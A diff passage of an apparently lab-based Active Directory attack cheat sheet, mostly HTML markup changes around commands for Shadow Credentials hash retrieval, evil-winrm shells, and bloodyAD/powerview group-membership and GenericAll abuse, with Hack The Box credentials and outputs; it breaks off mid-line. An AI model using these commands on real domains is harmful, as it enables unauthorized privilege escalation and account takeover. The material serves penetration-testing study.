-</span></span></span><span class="line"><span class="cl"><span class="go">[*] NT hash for &#39;winrm_user&#39;: 8738c7413a5da3bc1d083efc0ab06cb2
-</span></span></span></code></pre></div><h4 id="fix-kdc_err_padata_type_nosuppkdc-has-no-support-for-padata-type">FIX: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> No really a fix, need to runas administrator
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saved credential cache to 'winrm_user.ccache'
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Trying to retrieve NT hash for 'winrm_user'
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Restoring the old Key Credentials for 'winrm_user'
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully restored the old Key Credentials for 'winrm_user'
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] NT hash for 'winrm_user': 8738c7413a5da3bc1d083efc0ab06cb2
+</span></span></span></div></pre></div><h4 id="fix-kdc_err_padata_type_nosuppkdc-has-no-support-for-padata-type">FIX: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> No really a fix, need to runas administrator
 </span></span><span class="line"><span class="cl"><span class="go">gpupdate /force
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; gpupdate /force
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; gpupdate /force
 </span></span></span><span class="line"><span class="cl"><span class="go">Updating policy...
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Computer Policy update has completed successfully.
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">User Policy update has completed successfully.
-</span></span></span></code></pre></div><h4 id="3-remote">3. Remote</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Edit <span class="s1">&#39;/etc/krb5.conf&#39;</span> <span class="o">(</span>All uppercase<span class="o">)</span>
+</span></span></span></div></pre></div><h4 id="3-remote">3. Remote</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Edit <span class="s1">'/etc/krb5.conf'</span> <span class="o">(</span>All uppercase<span class="o">)</span>
 </span></span><span class="line"><span class="cl"><span class="go">[libdefaults]
-</span></span></span><span class="line"><span class="cl"><span class="go">    default_realm = &lt;DOMAIN&gt;
+</span></span></span><span class="line"><span class="cl"><span class="go">    default_realm = <span class="o">&lt;DOMAIN&gt;</span>
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[realms]
-</span></span></span><span class="line"><span class="cl"><span class="go">    &lt;DOMAIN&gt; = {
-</span></span></span><span class="line"><span class="cl"><span class="go">        kdc = &lt;DC&gt;:88
-</span></span></span><span class="line"><span class="cl"><span class="go">        admin_server = &lt;DC&gt;
-</span></span></span><span class="line"><span class="cl"><span class="go">        default_domain = &lt;DOMAIN&gt;
+</span></span></span><span class="line"><span class="cl"><span class="go">    <span class="o">&lt;DOMAIN&gt;</span> = {
+</span></span></span><span class="line"><span class="cl"><span class="go">        kdc = <span class="o">&lt;DC&gt;</span>:88
+</span></span></span><span class="line"><span class="cl"><span class="go">        admin_server = <span class="o">&lt;DC&gt;</span>
+</span></span></span><span class="line"><span class="cl"><span class="go">        default_domain = <span class="o">&lt;DOMAIN&gt;</span>
 </span></span></span><span class="line"><span class="cl"><span class="go">    }
 </span></span></span><span class="line"><span class="cl"><span class="go">    
 </span></span></span><span class="line"><span class="cl"><span class="go">[domain_realm]
-</span></span></span><span class="line"><span class="cl"><span class="go">    .domain.internal = &lt;DOMAIN&gt;
-</span></span></span><span class="line"><span class="cl"><span class="go">    domain.internal = &lt;DOMAIN&gt;
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">[libdefaults]
+</span></span></span><span class="line"><span class="cl"><span class="go">    .domain.internal = <span class="o">&lt;DOMAIN&gt;</span>
+</span></span></span><span class="line"><span class="cl"><span class="go">    domain.internal = <span class="o">&lt;DOMAIN&gt;</span>
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="go">[libdefaults]
 </span></span></span><span class="line"><span class="cl"><span class="go">    default_realm = ABSOLUTE.HTB
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[realms]
@@ -490,11 +480,13 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="go">[domain_realm]
 </span></span></span><span class="line"><span class="cl"><span class="go">    .domain.internal = ABSOLUTE.HTB
 </span></span></span><span class="line"><span class="cl"><span class="go">    domain.internal = ABSOLUTE.HTB
-</span></span></span></code></pre></div><br>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">export KRB5CCNAME=&lt;TARGET_USER&gt;.ccache
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> <span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>winrm_user.ccache
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">evil-winrm -i &lt;TARGET_DOMAIN&gt; -r &lt;DOMAIN&gt;
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> evil-winrm -i dc.absolute.htb -r absolute.htb
+</span></span></span></div></pre></div><br>
+<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">export KRB5CCNAME=<span class="o">&lt;TARGET_USER&gt;</span>.ccache
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="gp">$</span> <span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>winrm_user.ccache
+</span></span></div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">evil-winrm -i <span class="o">&lt;TARGET_DOMAIN&gt;</span> -r <span class="o">&lt;DOMAIN&gt;</span>
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="gp">$</span> evil-winrm -i dc.absolute.htb -r absolute.htb
 </span></span><span class="line"><span class="cl"><span class="go">                                        
 </span></span></span><span class="line"><span class="cl"><span class="go">Evil-WinRM shell v3.5
 </span></span></span><span class="line"><span class="cl"><span class="go">                                        
@@ -504,48 +496,53 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="go">                                        
 </span></span></span><span class="line"><span class="cl"><span class="go">Info: Establishing connection to remote endpoint
 </span></span></span><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\winrm_user\Documents&gt; 
-</span></span></span></code></pre></div></div></p>
+</span></span></span></div></pre></div></div></div><p></p>
 <hr>
 <h3 id="abuse-4--add-self-to-group-from-linux">Abuse #4 : Add Self to Group (From Linux)</h3>
-<p>
-<button data-tabset="set4" data-tabcontent="tab1" >bloodyAD</button>
+<p class="tabs">
+<button data-tabset="set4" data-tabcontent="tab1" class="active">bloodyAD</button>
 
-<button data-tabset="set4" data-tabcontent="tab2" >powerview.py</button>
+<button data-tabset="set4" data-tabcontent="tab2">powerview.py</button>
 
-<div class="tabcontent" data-tabset="set4" data-tabcontent="tab1"><h4 id="1-add-self-to-group">1. Add Self to Group</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With password
-</span></span><span class="line"><span class="cl"><span class="go">python3 bloodyAD.py -d &lt;DOMAIN&gt; -u &#39;&lt;USER&gt;&#39; -p &#39;&lt;PASSWORD&gt;&#39; --host &lt;DC&gt; add groupMember &#39;&lt;GROUP&gt;&#39; &#39;&lt;USER&gt;&#39;
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> python3 bloodyAD.py -d rebound.htb -u <span class="s1">&#39;oorend&#39;</span> -p <span class="s1">&#39;1GR8t@$$4u&#39;</span> --host 10.10.11.231 add groupMember SERVICEMGMT <span class="s1">&#39;oorend&#39;</span>
+</p><div class="tabset-wrapper" data-tabset-group="set4"><div class="tabcontent active" data-tabset="set4" data-tabcontent="tab1"><h4 id="1-add-self-to-group">1. Add Self to Group</h4>
+<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With password
+</span></span><span class="line"><span class="cl"><span class="go">python3 bloodyAD.py -d <span class="o">&lt;DOMAIN&gt;</span> -u '<span class="o">&lt;USER&gt;</span>' -p '<span class="o">&lt;PASSWORD&gt;</span>' --host <span class="o">&lt;DC&gt;</span> add groupMember '<span class="o">&lt;GROUP&gt;</span>' '<span class="o">&lt;USER&gt;</span>'
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="gp">$</span> python3 bloodyAD.py -d rebound.htb -u <span class="s1">'oorend'</span> -p <span class="s1">'1GR8t@$$4u'</span> --host 10.10.11.231 add groupMember SERVICEMGMT <span class="s1">'oorend'</span>
 </span></span><span class="line"><span class="cl"><span class="go">[+] oorend added to SERVICEMGMT
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With Kerberos
-</span></span><span class="line"><span class="cl"><span class="go">python3 bloodyAD.py -d &lt;DOMAIN&gt; -u &#39;&lt;USER&gt;&#39; -p &#39;&lt;PASSWORD&gt;&#39; -k --host &lt;DC&gt; add groupMember &#39;&lt;GROUP&gt;&#39; &#39;&lt;USER&gt;&#39;
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> python3 bloodyAD.py -d absolute.htb -u <span class="s1">&#39;m.lovegod&#39;</span> -p <span class="s1">&#39;AbsoluteLDAP2022!&#39;</span> -k --host dc.absolute.htb add groupMember <span class="s1">&#39;NETWORK AUDIT&#39;</span> <span class="s1">&#39;m.lovegod&#39;</span>
+</span></span></span></div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With Kerberos
+</span></span><span class="line"><span class="cl"><span class="go">python3 bloodyAD.py -d <span class="o">&lt;DOMAIN&gt;</span> -u '<span class="o">&lt;USER&gt;</span>' -p '<span class="o">&lt;PASSWORD&gt;</span>' -k --host <span class="o">&lt;DC&gt;</span> add groupMember '<span class="o">&lt;GROUP&gt;</span>' '<span class="o">&lt;USER&gt;</span>'
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="gp">$</span> python3 bloodyAD.py -d absolute.htb -u <span class="s1">'m.lovegod'</span> -p <span class="s1">'AbsoluteLDAP2022!'</span> -k --host dc.absolute.htb add groupMember <span class="s1">'NETWORK AUDIT'</span> <span class="s1">'m.lovegod'</span>
 </span></span><span class="line"><span class="cl"><span class="go">[+] m.lovegod added to NETWORK AUDIT
-</span></span></span></code></pre></div><h4 id="2-add-genericall-over-target-group">2. Add GenericAll over Target Group</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With password
-</span></span><span class="line"><span class="cl"><span class="go">python3 bloodyAD.py -d &lt;DOMAIN&gt; -u &#39;&lt;USER&gt;&#39; -p &#39;&lt;PASSWORD&gt;&#39; --host &lt;DC&gt; add genericAll &#39;OU=&lt;TARGET_GROUP&gt;,DC=&lt;EXAMPLE&gt;,DC=&lt;COM&gt;&#39; &#39;&lt;USER&gt;&#39;
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> python3 bloodyAD.py -d rebound.htb -u <span class="s1">&#39;oorend&#39;</span> -p <span class="s1">&#39;1GR8t@$$4u&#39;</span> --host 10.10.11.231 add genericAll <span class="s1">&#39;OU=SERVICE USERS,DC=REBOUND,DC=HTB&#39;</span> <span class="s1">&#39;oorend&#39;</span>
+</span></span></span></div></pre></div><h4 id="2-add-genericall-over-target-group">2. Add GenericAll over Target Group</h4>
+<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With password
+</span></span><span class="line"><span class="cl"><span class="go">python3 bloodyAD.py -d <span class="o">&lt;DOMAIN&gt;</span> -u '<span class="o">&lt;USER&gt;</span>' -p '<span class="o">&lt;PASSWORD&gt;</span>' --host <span class="o">&lt;DC&gt;</span> add genericAll 'OU=<span class="o">&lt;TARGET_GROUP&gt;</span>,DC=<span class="o">&lt;EXAMPLE&gt;</span>,DC=<span class="o">&lt;COM&gt;</span>' '<span class="o">&lt;USER&gt;</span>'
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="gp">$</span> python3 bloodyAD.py -d rebound.htb -u <span class="s1">'oorend'</span> -p <span class="s1">'1GR8t@$$4u'</span> --host 10.10.11.231 add genericAll <span class="s1">'OU=SERVICE USERS,DC=REBOUND,DC=HTB'</span> <span class="s1">'oorend'</span>
 </span></span><span class="line"><span class="cl"><span class="go">[+] oorend has now GenericAll on OU=SERVICE USERS,DC=REBOUND,DC=HTB
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With Kerberos
-</span></span><span class="line"><span class="cl"><span class="go">python3 bloodyAD.py -d &lt;DOMAIN&gt; -u &#39;&lt;USER&gt;&#39; -p &#39;&lt;PASSWORD&gt;&#39; -k --host &lt;DC&gt; add genericAll &#39;OU=&lt;TARGET_GROUP&gt;,DC=&lt;EXAMPLE&gt;,DC=&lt;COM&gt;&#39; &#39;&lt;USER&gt;&#39;
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> python3 bloodyAD.py -d absolute.htb -u <span class="s1">&#39;m.lovegod&#39;</span> -p <span class="s1">&#39;AbsoluteLDAP2022!&#39;</span> -k --host dc.absolute.htb add genericAll <span class="s1">&#39;NETWORK AUDIT&#39;</span> <span class="s1">&#39;m.lovegod&#39;</span> 
+</span></span></span></div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With Kerberos
+</span></span><span class="line"><span class="cl"><span class="go">python3 bloodyAD.py -d <span class="o">&lt;DOMAIN&gt;</span> -u '<span class="o">&lt;USER&gt;</span>' -p '<span class="o">&lt;PASSWORD&gt;</span>' -k --host <span class="o">&lt;DC&gt;</span> add genericAll 'OU=<span class="o">&lt;TARGET_GROUP&gt;</span>,DC=<span class="o">&lt;EXAMPLE&gt;</span>,DC=<span class="o">&lt;COM&gt;</span>' '<span class="o">&lt;USER&gt;</span>'
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="gp">$</span> python3 bloodyAD.py -d absolute.htb -u <span class="s1">'m.lovegod'</span> -p <span class="s1">'AbsoluteLDAP2022!'</span> -k --host dc.absolute.htb add genericAll <span class="s1">'NETWORK AUDIT'</span> <span class="s1">'m.lovegod'</span> 
 </span></span><span class="line"><span class="cl"><span class="go">[+] m.lovegod has now GenericAll on NETWORK AUDIT
-</span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/CravateRouge/bloodyAD">bloodyAD</a></em></small></p></div>
-
-<div class="tabcontent" data-tabset="set4" data-tabcontent="tab2"><h4 id="1-connect">1. Connect</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; powerview &#39;&lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;TARGET_DOMAIN&gt;&#39;
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo ntpdate -s dc01.rebound.htb <span class="o">&amp;&amp;</span> powerview <span class="s1">&#39;rebound.htb/oorend:1GR8t@$$4u@dc01.rebound.htb&#39;</span>
+</span></span></span></div></pre></div><p><small><em>Ref: <a href="https://github.com/CravateRouge/bloodyAD">bloodyAD</a></em></small></p></div><div class="tabcontent" data-tabset="set4" data-tabcontent="tab2"><h4 id="1-connect">1. Connect</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s <span class="o">&lt;DC&gt;</span> &amp;&amp; powerview '<span class="o">&lt;DOMAIN&gt;</span>/<span class="o">&lt;USER&gt;</span>:<span class="o">&lt;PASSWORD&gt;</span>@<span class="o">&lt;TARGET_DOMAIN&gt;</span>'
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="gp">$</span> sudo ntpdate -s dc01.rebound.htb <span class="o">&amp;&amp;</span> powerview <span class="s1">'rebound.htb/oorend:1GR8t@$$4u@dc01.rebound.htb'</span>
 </span></span><span class="line"><span class="cl"><span class="go">Logging directory is set to /home/kali/.powerview/logs/dc01.rebound.htb
 </span></span></span><span class="line"><span class="cl"><span class="go">[2024-09-24 07:11:06] Channel binding is enforced!
 </span></span></span><span class="line"><span class="cl"><span class="go">(LDAPS)-[dc01.rebound.htb]-[rebound\oorend]
 </span></span></span><span class="line"><span class="cl"><span class="go">PV &gt; 
-</span></span></span></code></pre></div><h4 id="2-add-self-to-group">2. Add Self to Group</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Add-DomainGroupMember -Identity &#39;&lt;GROUP&gt;&#39; -Members &#39;&lt;USER&gt;&#39;
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PV &gt; Add-DomainGroupMember -Identity &#39;servicemgmt&#39; -Members &#39;oorend&#39;
+</span></span></span></div></pre></div><h4 id="2-add-self-to-group">2. Add Self to Group</h4>
+<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Add-DomainGroupMember -Identity '<span class="o">&lt;GROUP&gt;</span>' -Members '<span 